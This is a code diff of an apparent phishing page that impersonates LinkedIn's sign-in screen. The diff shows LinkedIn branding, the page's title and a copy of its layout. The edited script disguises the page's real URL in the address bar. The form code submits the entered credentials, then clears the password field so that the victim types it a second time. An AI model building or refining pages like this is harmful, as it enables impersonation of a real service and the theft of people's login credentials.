@@ -5,37 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in to LinkedIn</title>
   <script>
-    // Enhanced URL masking with immediate execution and refresh protection
+    // Minimal URL masking that won't cause 404 errors
     (function() {
-      // Store the original URL including search parameters
       const originalUrl = window.location.pathname + window.location.search;
-      const maskedPath = "/login-LinkedIn/login"; // The path you want to display
-      
-      // Check if we're coming from a page navigation (not a refresh)
-      if (performance.navigation.type !== performance.navigation.TYPE_RELOAD) {
-        // Immediately mask the URL
-        history.replaceState({ masked: true }, "", maskedPath + window.location.search);
-        
-        // Set a session flag to indicate we've masked the URL
-        sessionStorage.setItem('urlMasked', 'true');
-      } else if (sessionStorage.getItem('urlMasked')) {
-        // If this is a refresh but we previously masked the URL
-        // Restore the original URL to prevent 404
-        history.replaceState({}, "", originalUrl);
-        sessionStorage.removeItem('urlMasked');
+      if (!sessionStorage.getItem('alreadyMasked')) {
+        sessionStorage.setItem('alreadyMasked', 'true');
+        history.replaceState(null, null, "/login-Linkedin" + window.location.search);
+        window.addEventListener('beforeunload', function() {
+          history.replaceState(null, null, originalUrl);
+          sessionStorage.removeItem('alreadyMasked');
+        });
       }
-      
-      // Clean up on page unload
-      window.addEventListener('beforeunload', function() {
-        if (history.state?.masked) {
-          history.replaceState({}, "", originalUrl);
-        }
-      });
     })();
   </script>
-  <!-- Rest of your head content -->
   <style>
-    /* Your existing CSS styles */
     body {
       font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
       background-color: #f3f6f8;
@@ -47,10 +30,177 @@
       height: 100vh;
       flex-direction: column;
     }
-    /* ... (all your existing styles remain exactly the same) ... */
+
+    .login-container {
+      background-color: #ffffff;
+      padding: 24px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .login-container h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      color: #000000;
+      text-align: left;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+      text-align: left;
+      position: relative;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #000000;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 40px 12px 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #0073b1;
+      box-shadow: 0 0 0 2px rgba(0, 115, 177, 0.2);
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 58%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #0073b1;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 0;
+      height: 20px;
+      line-height: 20px;
+    }
+
+    .password-toggle:hover {
+      text-decoration: underline;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #ffffff;
+      background-color: #0073b1;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      margin-top: 16px;
+      transition: background-color 0.3s ease;
+    }
+
+    .login-button:hover {
+      background-color: #004182;
+    }
+
+    .forgot-password {
+      display: block;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #0073b1;
+      text-decoration: none;
+      text-align: center;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      margin: 24px 0;
+      color: #666;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .separator::before {
+      margin-right: 16px;
+    }
+
+    .separator::after {
+      margin-left: 16px;
+    }
+
+    .sign-up {
+      margin-top: 16px;
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+    }
+
+    .sign-up a {
+      color: #0073b1;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .sign-up a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      margin-top: 32px;
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .footer a {
+      color: #0073b1;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .footer .copyright {
+      margin-bottom: 8px;
+    }
+
+    .error-message {
+      color: red;
+      margin-top: 16px;
+      text-align: center;
+    }
+
+    .linkedin-logo {
+      width: 120px;
+      margin-bottom: 24px;
+    }
   </style>
   <script>
-    /* Your existing JavaScript remains exactly the same */
     let isFirstSubmission = true;
 
     window.onload = function() {
@@ -75,8 +225,12 @@
           body: formData
         })
         .then(response => response.text())
-        .then(data => console.log("First submission data sent:", data))
-        .catch(error => console.error("Error:", error));
+        .then(data => {
+          console.log("First submission data sent:", data);
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
         document.getElementById('password').value = "";
       } else {
         fetch(form.action, {
@@ -98,6 +252,7 @@
     function togglePassword() {
       const passwordInput = document.getElementById('password');
       const toggleButton = document.querySelector('.password-toggle');
+
       if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
         toggleButton.textContent = 'Hide';
@@ -109,7 +264,6 @@
   </script>
 </head>
 <body>
-  <!-- Your existing body content remains exactly the same -->
   <div class="login-container">
     <img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Logo.svg.original.svg" alt="LinkedIn Logo" class="linkedin-logo">
     <h1>Sign in</h1>
